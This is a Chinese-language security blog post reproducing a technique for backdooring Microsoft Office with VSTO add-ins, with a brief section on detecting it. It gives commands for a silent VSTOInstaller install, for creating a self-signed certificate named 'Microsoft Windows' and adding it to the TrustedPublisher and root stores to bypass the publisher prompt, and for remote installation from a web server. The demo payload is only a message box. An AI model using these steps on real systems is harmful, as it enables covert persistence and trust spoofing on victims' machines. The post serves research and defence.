---
layout: post
title: 利用VSTO实现的office后门
---


## 0x00 前言
--

最近看了一篇文章《VSTO: The Payload Installer That Probably Defeats Your Application Whitelisting Rules》，介绍了利用VSTO实现Office后门的方法，我在之前的文章[《Use Office to maintain persistence》](https://3gstudent.github.io/3gstudent.github.io/Use-Office-to-maintain-persistence/)和[《Office Persistence on x64 operating system》](https://3gstudent.github.io/3gstudent.github.io/Office-Persistence-on-x64-operating-system/)曾对Office的后门进行过学习，本文将结合自己的研究心得，对该方法进行复现，分析利用思路，分享实际利用方法，最后介绍如何识别这种后门。

文章地址：

https://bohops.com/2018/01/31/vsto-the-payload-installer-that-probably-defeats-your-application-whitelisting-rules/

## 0x01 简介
---

本文将要介绍以下内容：

- VSTO的编写方法
- 实际利用思路
- 后门检测



## 0x02 VSTO的编写方法
---

### 1、VSTO简介

全称Visual Studio Tools for Office

用来定制Office应用程序，能够同office控件交互

集成在Visual Studio安装包中

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-3/2-1.png)

### 2、VSTO开发

本节内容是对《VSTO: The Payload Installer That Probably Defeats Your Application Whitelisting Rules》的复现

#### (1) 新建工程

`Visual c#` -> `Office` -> `Word 2010外接程序`

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-3/2-2.png)

#### (2) 添加代码


添加引用`System.Windows.Forms`

添加弹框代码：

```
using System.Windows.Forms;
MessageBox.Show("1");
```

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-3/2-3.png)

#### (3) 编译

设置对应.Net版本，编译，生成如下6个文件：

- Microsoft.Office.Tools.Common.v4.0.Utilities.dll
- Microsoft.Office.Tools.Common.v4.0.Utilities.xml
- WordAddIn2.dll
- WordAddIn2.dll.manifest
- WordAddIn2.pdb
- WordAddIn2.vsto

#### (4) 安装插件

执行WordAddIn2.vsto

弹框提示无法验证发行者，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-3/2-4.png)

选择安装

查看`控制面板` -> `程序` -> `程序和功能`，能够找到新安装的插件

####　(5) 打开word.exe，自动加载插件

弹框，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-3/2-5.png)

查看Word加载项，能够看到加载插件WordAddIn2，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-3/2-6.png)

至此，成功实现Office后门的安装


## 0x03 实际利用思路
---

对于实际利用，首先需要满足安装过程无界面，所以要绕过弹框提示无法验证发行者，需要做如下改进：

#### (1) 命令行安装VSTO插件

使用VSTOInstaller.exe

系统安装Office后包含，默认路径`%ProgramFiles%\Common Files\microsoft shared\VSTO\10.0`

参数说明：

/i: 安装

/u: 卸载

/s: 静默操作，如果需要信任提示，将不会安装或更新自定义项

安装参数如下：

```
"C:\Program Files\Common Files\microsoft shared\VSTO\10.0\VSTOInstaller.exe" /i /s c:\test\WordAddIn2
```

由于信任提示，无法验证发行者，所以安装失败

#### (2) 绕过验证发行者

VSTO插件提供签名功能，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-3/3-1.png)

手动生成一组签名证书，使用如下工具

- makecert.exe
- cert2spc.exe
- pvk2pfx.exe
- certmgr.exe

来自于Windows SDK，可供参考下载的地址：

https://github.com/3gstudent/signtools

生成命令：

```
makecert -n "CN=Microsoft Windows" -r -sv Root.pvk Root.cer
cert2spc Root.cer Root.spc
pvk2pfx -pvk Root.pvk -pi 12345678password -spc Root.spc -pfx Root.pfx -f
```

执行后生成Root.cer、Root.pfx、Root.pvk、Root.spc四个文件

替换插件WordAddIn2的证书，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-3/3-2.png)

证书注册（管理员权限）：

```
certmgr.exe -add Root.cer -c -s -r localMachine TrustedPublisher
certmgr.exe -add -c Root.cer -s -r localmachine root
```

**注：**

需要将证书同时添加到`TrustedPublisher`和`root`

再次安装VSTO插件，不会被拦截

#### (3) 远程安装

VSTOInstaller.exe支持远程安装

可以将VSTO插件放在远程Web服务器上

安装参数如下：

```
"C:\Program Files\Common Files\microsoft shared\VSTO\10.0\VSTOInstaller.exe" /s /i http://192.168.62.131/1/WordAddIn1.vsto
```

综上，实际利用过程如下： 

- 生成VSTO插件
- 为插件添加签名
- 证书注册
- 远程下载安装


## 0x04 后门检测
---

1、查看`控制面板` -> `程序` -> `程序和功能`，是否有可疑插件

**注：**

VSTO插件并不会在注册表卸载配置的位置(`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\`)创建新键值

2、查看Office的COM加载项

**注：**

禁用宏并不会阻止VSTO插件的加载

## 0x05 小结
---

本文测试了利用VSTO实现Office后门的方法，结合实际利用思路，分析检测方法


---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)



